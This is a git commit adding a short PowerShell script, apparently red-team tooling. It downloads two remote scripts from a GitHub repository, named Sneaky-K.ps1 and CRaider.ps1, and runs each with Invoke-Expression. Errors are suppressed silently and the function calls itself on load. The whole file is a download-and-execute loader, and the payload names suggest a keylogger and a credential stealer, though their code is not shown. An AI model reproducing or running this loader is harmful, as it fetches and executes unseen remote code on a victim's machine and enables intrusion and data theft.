31257c330332dd55bc584e7695b5fe41a594126f
MajesticBear01 <rubyroguerecon@proton.me>
2024-09-25 11:10:29 -0600

    Add files via upload

---
+++ 9_25_2024_PublicPages.ps1
@@ -0,0 +1,24 @@
+function Invoke-Pages {
+
+$URLs = @(
+    'https://raw.githubusercontent.com/MajesticBear01/RedTeaming/refs/heads/main/Sneaky-K.ps1',
+    'https://raw.githubusercontent.com/MajesticBear01/RedTeaming/refs/heads/main/CRaider.ps1',
+)
+
+
+foreach ($URL in $URLs) {
+    try {
+        $ScriptBytes = Invoke-WebRequest -Uri $URL -UseBasicParsing -Method Get -MaximumRedirection 0
+        
+        Invoke-Expression -Command $ScriptBytes.Content
+	Start-Sleep 15
+    } catch {
+
+    }
+}
+}
+
+
+
+#Call the page function
+Invoke-Pages
